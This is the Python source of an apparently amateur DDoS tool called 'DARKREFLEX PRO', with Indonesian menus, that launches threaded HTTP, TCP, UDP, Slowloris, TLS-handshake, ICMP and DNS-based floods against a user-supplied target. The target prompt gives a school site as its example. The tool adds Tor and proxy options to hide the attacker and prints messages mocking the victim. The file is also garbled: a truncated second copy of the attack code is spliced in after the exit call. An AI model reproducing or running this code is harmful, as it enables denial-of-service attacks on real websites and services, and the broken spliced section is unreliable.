#!/usr/bin/env python3
# MarzTamvan

import requests
import threading
import socket
import random
import time
import os
import sys
import hashlib
from datetime import datetime

os.system('clear')

# ==================== BANNER KEREN ====================
def banner():
    print("\033[91m" + r"""
╔═══════════════════════════════════════════════════════════════════════════════════╗
║                                                                                   ║
║   ██████╗  █████╗ ██████╗ ██╗  ██╗██████╗ ███████╗███████╗██╗    ██████╗ ██████╗  ║
║   ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██╔════╝██╔════╝██║    ██╔══██╗██╔══██╗ ║
║   ██║  ██║███████║██████╔╝█████╔╝ ██████╔╝█████╗  █████╗  ██║    ██████╔╝██████╔╝ ║
║   ██║  ██║██╔══██║██╔══██╗██╔═██╗ ██╔══██╗██╔══╝  ██╔══╝  ██║    ██╔══██╗██╔══██╗ ║
║   ██████╔╝██║  ██║██║  ██║██║  ██╗██████╔╝███████╗██║     ██████╗██║  ██║██║  ██║ ║
║   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ║
║                                                                                   ║
║   ██████╗ ██████╗  ██████╗                                                         ║
║   ██╔══██╗██╔══██╗██╔═══██╗                                                        ║
║   ██████╔╝██████╔╝██║   ██║                                                        ║
║   ██╔══██╗██╔══██╗██║   ██║                                                        ║
║   ██║  ██║██║  ██║╚██████╔╝                                                        ║
║   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝                                                         ║
║                                                                                   ║
║                    DARKREFLEX PRO v4.0 - 7 LAYER DDoS                             ║
║                    https://github.com/Marzzz-dev/D4RKR3FL3X                       ║
║                    "Nangis lu, gue ketawa"                                         ║
║                                                                                   ║
╚═══════════════════════════════════════════════════════════════════════════════════╝
    \033[0m")
    print(f"\033[92m[+] Loaded at: {datetime.now().strftime('%H:%M:%S')}\033[0m")
    print("\033[93m[+] Mode: FULL DESTRUCTION\033[0m")
    print("\033[91m[+] Anonim: PROXY + TOR READY\033[0m\n")

# ==================== FAKE LOADING ====================
def loading():
    print("\033[96m[!] Loading modules", end="")
    for _ in range(3):
        time.sleep(0.3)
        print(".", end="", flush=True)
    print(" DONE!\033[0m\n")
    time.sleep(0.5)

# ==================== MENU UTAMA ====================
def main_menu():
    banner()
    loading()
    
    print("\033[95m┌─────────────────────────────────────────────────────────────────┐\033[0m")
    print("\033[95m│                    MAIN MENU - DARKREFLEX                       │\033[0m")
    print("\033[95m├─────────────────────────────────────────────────────────────────┤\033[0m")
    print("\033[95m│                                                                 │\033[0m")
    print("\033[91m│  [1] 🔥 START FULL ATTACK (7 LAYER)                            │\033[0m")
    print("\033[93m│  [2] 🎯 SINGLE LAYER ATTACK                                     │\033[0m")
    print("\033[94m│  [3] 🛡️  ANONIM MODE (Proxy + Tor)                              │\033[0m")
    print("\033[96m│  [4] 📋 LIST ATTACK METHODS                                     │\033[0m")
    print("\033[92m│  [5] ⚙️  SETTINGS                                               │\033[0m")
    print("\033[90m│  [6] 🧹 CLEAR SCREEN                                            │\033[0m")
    print("\033[91m│  [0] 💀 EXIT                                                    │\033[0m")
    print("\033[95m│                                                                 │\033[0m")
    print("\033[95m└─────────────────────────────────────────────────────────────────┘\033[0m")
    print("")
    return input("\033[92m┌─[root@darkreflex]──[~]\n└──╼ \033[0m")

# ==================== SINGLE LAYER MENU ====================
def single_layer_menu():
    os.system('clear')
    banner()
    print("\033[95m┌─────────────────────────────────────────────────────────────────┐\033[0m")
    print("\033[95m│                   SINGLE LAYER ATTACK                           │\033[0m")
    print("\033[95m├─────────────────────────────────────────────────────────────────┤\033[0m")
    print("\033[91m│  [1] HTTP/S FLOOD    - Request HTTP massal                      │\033[0m")
    print("\033[91m│  [2] TCP FLOOD       - Koneksi TCP bertubi-tubi                 │\033[0m")
    print("\033[91m│  [3] UDP FLOOD       - Packet UDP gedean                        │\033[0m")
    print("\033[91m│  [4] SLOWLORIS       - Bikin server lemot pelan-pelan           │\033[0m")
    print("\033[91m│  [5] HTTPS RENEG     - SSL renegotiation attack                 │\033[0m")
    print("\033[91m│  [6] ICMP FLOOD      - Ping of death                            │\033[0m")
    print("\033[91m│  [7] DNS AMP         - DNS amplification                        │\033[0m")
    print("\033[95m│  [0] KEMBALI                                                   │\033[0m")
    print("\033[95m└─────────────────────────────────────────────────────────────────┘\033[0m")
    return input("\033[92m┌─[root@darkreflex]──[~]\n└──╼ \033[0m")

# ==================== LAYER METHODS ====================
def get_target():
    os.system('clear')
    banner()
    print("\033[93m┌─────────────────────────────────────────────────────────────────┐\033[0m")
    print("\033[93m│                      TARGET CONFIG                              │\033[0m")
    print("\033[93m└─────────────────────────────────────────────────────────────────┘\033[0m")
    print("")
    target = input("\033[96m[?] Target URL (contoh: https://sekolah.sch.id): \033[0m")
    port = int(input("\033[96m[?] Port (80/443): \033[0m") or 80)
    dur = int(input("\033[96m[?] Durasi (detik): \033[0m"))
    threads = int(input("\033[96m[?] Thread (100-300): \033[0m") or 200)
    
    if target.startswith("https://"):
        host = target.replace("https://", "").split("/")[0]
        ssl = True
    else:
        host = target.replace("http://", "").split("/")[0]
        ssl = False
    
    return target, host, port, dur, threads, ssl

def start_attack(layer_choice=None):
    target, host, port, dur, threads, ssl = get_target()
    
    print("\n\033[91m┌─────────────────────────────────────────────────────────────────┐\033[0m")
    print("\033[91m│                      🔥 SERANGAN DIMULAI 🔥                      │\033[0m")
    print("\033[91m└─────────────────────────────────────────────────────────────────┘\033[0m")
    print(f"\033[92m[✓] Target: {host}:{port}\033[0m")
    print(f"\033[92m[✓] Durasi: {dur} detik\033[0m")
    print(f"\033[92m[✓] Threads: {threads}\033[0m")
    print("\033[91m[!] Gaskeun... Ctrl+C buat berenti\033[0m\n")
    
    # Fake headers
    ua_list = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    ]
    
    # Layer 1: HTTP Flood
    def http_flood():
        end = time.time() + dur
        while time.time() < end:
            try:
                headers = {'User-Agent': random.choice(ua_list), 'Referer': 'https://google.com'}
                url = f"{'https' if ssl else 'http'}://{host}:{port}/?x={random.randint(1,9999)}"
                requests.get(url, headers=headers, timeout=2)
                requests.post(url, headers=headers, data={'data': random.randint(1,9999)}, timeout=2)
            except:
                pass
    
    # Layer 2: TCP Flood
    def tcp_flood():
        end = time.time() + dur
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((host, port))
                s.send(random._urandom(1024) + b"\r\n")
                s.close()
            except:
                pass
    
    # Layer 3: UDP Flood
    def udp_flood():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet = random._urandom(65500)
        end = time.time() + dur
        while time.time() < end:
            try:
                s.sendto(packet, (host, port))
            except:
                pass
    
    # Layer 4: Slowloris
    def slowloris():
        socket_list = []
        end = time.time() + dur
        for _ in range(100):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((host, port))
                s.send(f"GET /?{random.randint(1,9999)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {host}\r\n".encode())
                socket_list.append(s)
            except:
                pass
        while time.time() < end:
            for s in socket_list[:]:
                try:
                    s.send(f"X-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode())
                except:
                    socket_list.remove(s)
            time.sleep(5)
    
    # Layer 5: HTTPS
    def https_flood():
        if not ssl:
            return
        import ssl
        end = time.time() + dur
        while time.time() < end:
            try:
                ctx = ssl.create_default_context()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((host, port))
                ss = ctx.wrap_socket(s, server_hostname=host)
                ss.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
                ss.close()
            except:
                pass
    
    # Layer 6: ICMP
    def icmp_flood():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet = b'\x08\x00\x00\x00\x00\x00\x00\x00' + random._urandom(56)
            end = time.time() + dur
            while time.time() < end:
                try:
                    s.sendto(packet, (host, 0))
                except:
                    pass
        except:
            udp_flood()
    
    # Layer 7: DNS Amplification
    def dns_amp():
        dns_list = ["8.8.8.8", "1.1.1.1", "8.8.4.4"]
        payload = b'\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01'
        end = time.time() + dur
        while time.time() < end:
            for dns in dns_list:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(payload, (dns, 53))
                except:
                    pass
    
    layers = [http_flood, tcp_flood, udp_flood, slowloris, https_flood, icmp_flood, dns_amp]
    
    # Kalo pilih single layer
    if layer_choice is not None and 1 <= layer_choice <= 7:
        for _ in range(threads):
            threading.Thread(target=layers[layer_choice-1], daemon=True).start()
        print(f"\033[92m[✓] Layer {layer_choice} AKTIF dengan {threads} thread\033[0m")
    else:
        for layer in layers:
            for _ in range(threads // 7):
                threading.Thread(target=layer, daemon=True).start()
        print("\033[92m[✓] 7 LAYER AKTIF SEMUA!\033[0m")
    
    print("\033[91m[!] Target lagi kena batang...\033[0m\n")
    
    try:
        time.sleep(dur)
    except KeyboardInterrupt:
        print("\n\033[93m[!] Lo berentiin sendiri\033[0m")
        input("\n\033[96m[*] Tekan Enter balik ke menu...\033[0m")
        return
    
    print("\n\033[92m[✓] SELESAI! Webnya tinggal kenangan\033[0m")
    input("\n\033[96m[*] Tekan Enter balik ke menu...\033[0m")

# ==================== ANONIM MODE ====================
def anonim_mode():
    os.system('clear')
    banner()
    print("\033[95m┌─────────────────────────────────────────────────────────────────┐\033[0m")
    print("\033[95m│                      ANONIM MODE SETUP                          │\033[0m")
    print("\033[95m├─────────────────────────────────────────────────────────────────┤\033[0m")
    print("\033[91m│  [1] Install Tor                                               │\033[0m")
    print("\033[91m│  [2] Start Tor (background)                                    │\033[0m")
    print("\033[91m│  [3] Install Proxy Rotator                                     │\033[0m")
    print("\033[91m│  [4] Test Anonimity (cek IP lo)                                │\033[0m")
    print("\033[95m│  [0] Kembali                                                   │\033[0m")
    print("\033[95m└─────────────────────────────────────────────────────────────────┘\033[0m")
    choice = input("\033[92m┌─[root@darkreflex]──[~]\n└──╼ \033[0m")
    
    if choice == "1":
        os.system("pkg install tor -y")
        input("\n[✓] Selesai. Enter...")
    elif choice == "2":
        os.system("tor &")
        input("\n[✓] Tor jalan. Enter...")
    elif choice == "3":
        os.system("pip install pysocks")
        input("\n[✓] Selesai. Enter...")
    elif choice == "4":
        os.system("curl ifconfig.me")
        input("\n[*] IP lo di atas. Enter...")
    anonim_mode()

# ==================== LIST METHODS ====================
def list_methods():
    os.system('clear')
    banner()
    print("\033[95m┌─────────────────────────────────────────────────────────────────┐\033[0m")
    print("\033[95m│                    ATTACK METHODS LIST                          │\033[0m")
    print("\033[95m├─────────────────────────────────────────────────────────────────┤\033[0m")
    print("\033[91m│                                                                 │\033[0m")
    print("\033[91m│  🔥 HTTP/S FLOOD                                                │\033[0m")
    print("\033[90m│     → Request HTTP/HTTPS massal                                 │\033[0m")
    print("\033[90m│     → Target: Web server biasa                                  │\033[0m")
    print("\033[91m│                                                                 │\033[0m")
    print("\033[91m│  🔥 TCP FLOOD                                                   │\033[0m")
    print("\033[90m│     → Buka koneksi TCP sebanyak mungkin                         │\033[0m")
    print("\033[90m│     → Target: Semua service                                     │\033[0m")
    print("\033[91m│                                                                 │\033[0m")
    print("\033[91m│  🔥 UDP FLOOD                                                   │\033[0m")
    print("\033[90m│     → Kirim packet UDP gedean                                   │\033[0m")
    print("\033[90m│     → Target: Game server, DNS, VPN                             │\033[0m")
    print("\033[91m│                                                                 │\033[0m")
    print("\033[91m│  🔥 SLOWLORIS                                                   │\033[0m")
    print("\033[90m│     → Buka koneksi pelan-pelan sampai server kelelahan          │\033[0m")
    print("\033[90m│     → Target: Apache, IIS                                       │\033[0m")
    print("\033[91m│                                                                 │\033[0m")
    print("\033[91m│  🔥 HTTPS RENEGOTIATION                                         │\033[0m")
    print("\033[90m│     → Abuse SSL renegotiation                                   │\033[0m")
    print("\033[90m│     → Target: Server pake HTTPS                                 │\033[0m")
    print("\033[91m│                                                                 │\033[0m")
    print("\033[91m│  🔥 ICMP FLOOD (PING OF DEATH)                                  │\033[0m")
    print("\033[90m│     → Banjirin pinger                                           │\033[0m")
    print("\033[90m│     → Target: Server jaringan                                   │\033[0m")
    print("\033[91m│                                                                 │\033[0m")
    print("\033[91m│  🔥 DNS AMPLIFICATION                                           │\033[0m")
    print("\033[90m│     → Pake DNS server buat ngebomb target                       │\033[0m")
    print("\033[90m│     → Target: DNS resolver                                      │\033[0m")
    print("\033[91m│                                                                 │\033[0m")
    print("\033[95m└─────────────────────────────────────────────────────────────────┘\033[0m")
    input("\n\033[96m[*] Tekan Enter...\033[0m")

# ==================== SETTINGS ====================
def settings():
    os.system('clear')
    banner()
    print("\033[95m┌─────────────────────────────────────────────────────────────────┐\033[0m")
    print("\033[95m│                         SETTINGS                                │\033[0m")
    print("\033[95m├─────────────────────────────────────────────────────────────────┤\033[0m")
    print("\033[91m│  [1] Default Thread: 200                                        │\033[0m")
    print("\033[91m│  [2] Default Port: 80                                           │\033[0m")
    print("\033[91m│  [3] Timeout: 2 detik                                           │\033[0m")
    print("\033[95m│  [0] Kembali                                                   │\033[0m")
    print("\033[95m└─────────────────────────────────────────────────────────────────┘\033[0m")
    input("\n[*] Settings masih beta. Enter...")

# ==================== MAIN LOOP ====================
if __name__ == "__main__":
    while True:
        choice = main_menu()
        
        if choice == "1":
            start_attack()
        elif choice == "2":
            sub = single_layer_menu()
            if sub.isdigit() and 1 <= int(sub) <= 7:
                start_attack(int(sub))
        elif choice == "3":
            anonim_mode()
        elif choice == "4":
            list_methods()
        elif choice == "5":
            settings()
        elif choice == "6":
            os.system('clear')
        elif choice == "0":
            os.system('clear')
            print("\033[91m" + r"""
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   ██████╗  █████╗ ██████╗ ██╗  ██╗██████╗ ███████╗███████╗    ║
║   ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗██╔════╝██╔════╝    ║
║   ██████╔╝███████║██████╔╝█████╔╝ ██████╔╝█████╗  █████╗      ║
║   ██╔══██╗██╔══██║██╔══██╗██╔═██╗ ██╔══██╗██╔══╝  ██╔══╝      ║
║   ██║  ██║██║  ██║██║  ██║██║  ██╗██████╔╝███████╗██║         ║
║   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝         ║
║                                                               ║
║              Thanks for using DARKREFLEX PRO                  ║
║              "Jangan lupa subscribe channel gue"              ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
            \033[0m")
            sys.exit()        for _ in range(50)
    ]
    proxy = random.choice(proxy_list)
    return {"http": f"http://{proxy}", "https": f"http://{proxy}"}

# ========== LAYER 1: HTTP/S FLOOD ==========
def http_flood():
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            headers = {
                'User-Agent': random.choice(user_agents),
                'Referer': random.choice(refers),
                'Accept': '*/*',
                'Connection': 'keep-alive'
            }
            url = f"{'https' if ssl_mode else 'http'}://{host}:{port}/?" + "".join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=10))
            requests.get(url, headers=headers, proxies=get_proxy(), timeout=2, verify=False)
            requests.post(url, headers=headers, proxies=get_proxy(), data={'x': random.randint(1,9999)}, timeout=2)
        except:
            pass

# ========== LAYER 2: TCP FLOOD ==========
def tcp_flood():
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((host, port))
            sock.send(random._urandom(1024) + b"\r\n" + b"X"*1024)
            sock.close()
        except:
            pass

# ========== LAYER 3: UDP FLOOD ==========
def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(65500)
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock.sendto(packet, (host, port))
        except:
            pass

# ========== LAYER 4: SLOWLORIS ==========
def slowloris():
    sockets_list = []
    end_time = time.time() + duration
    for _ in range(150):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((host, port))
            sock.send(f"GET /?{random.randint(1,9999)} HTTP/1.1\r\n".encode())
            sock.send(f"Host: {host}\r\n".encode())
            sock.send(f"User-Agent: {random.choice(user_agents)}\r\n".encode())
            sock.send("Accept: */*\r\n".encode())
            sockets_list.append(sock)
        except:
            pass
    
    while time.time() < end_time:
        for sock in sockets_list[:]:
            try:
                sock.send(f"X-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode())
            except:
                sockets_list.remove(sock)
        time.sleep(5)

# ========== LAYER 5: HTTPS RENEGOTIATION ==========
def https_reneg():
    if not ssl_mode:
        return
    import ssl
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            context = ssl.create_default_context()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((host, port))
            ssl_sock = context.wrap_socket(sock, server_hostname=host)
            ssl_sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
            ssl_sock.close()
        except:
            pass

# ========== LAYER 6: ICMP FLOOD ==========
def icmp_flood():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        packet = b'\x08\x00\x00\x00\x00\x00\x00\x00' + random._urandom(56)
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                sock.sendto(packet, (host, 0))
            except:
                pass
    except:
        udp_flood()

# ========== LAYER 7: DNS AMPLIFICATION ==========
def dns_amp():
    dns_servers = ["8.8.8.8", "1.1.1.1", "8.8.4.4", "208.67.222.222"]
    payload = b'\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01'
    end_time = time.time() + duration
    while time.time() < end_time:
        for dns in dns_servers:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(payload, (dns, 53))
            except:
                pass

# ========== EKSEKUSI ==========
print(f"\n[+] Target: {host}:{port}")
print(f"[+] Duration: {duration} detik")
print(f"[+] Threads: {threads}")
print(f"[+] Mode: FULL 7-LAYER DDoS")
print(f"[+] Anonim: Proxy Rotation + Header Spoof")
print("\n[*] Meluncurkan serangan... Tekan Ctrl+C buat berhenti\n")

# Start all layers
layers = [http_flood, tcp_flood, udp_flood, slowloris, https_reneg, icmp_flood, dns_amp]
for layer in layers:
    for _ in range(threads // 7):
        threading.Thread(target=layer, daemon=True).start()

print("[✓] ALL 7 LAYERS DEPLOYED!")
print(f"[✓] {host} sedang diserang...")

try:
    time.sleep(duration)
except KeyboardInterrupt:
    print("\n[!] Serangan dihentikan oleh user")
    sys.exit()

print("\n[✓] Serangan selesai!")
